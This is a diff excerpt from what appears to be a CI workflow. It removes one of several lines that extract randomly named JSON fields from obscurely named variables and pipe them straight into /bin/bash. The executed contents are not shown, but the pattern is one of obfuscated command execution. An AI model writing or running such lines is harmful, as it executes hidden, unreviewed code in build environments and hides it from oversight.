@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$gz37" | jq -r .nqwem30515 | /bin/bash
           echo $k61 | jq -r .xgmyp928 | /bin/bash
           printf '%s' "$tsm23" | jq -r .v1886 | /bin/bash
-          echo $uyysv42 | jq -r .puiss3210 | /bin/bash
           printf '%s' "$ubc0" | jq -r .gx1 | /bin/bash
 
       - name: Archive results
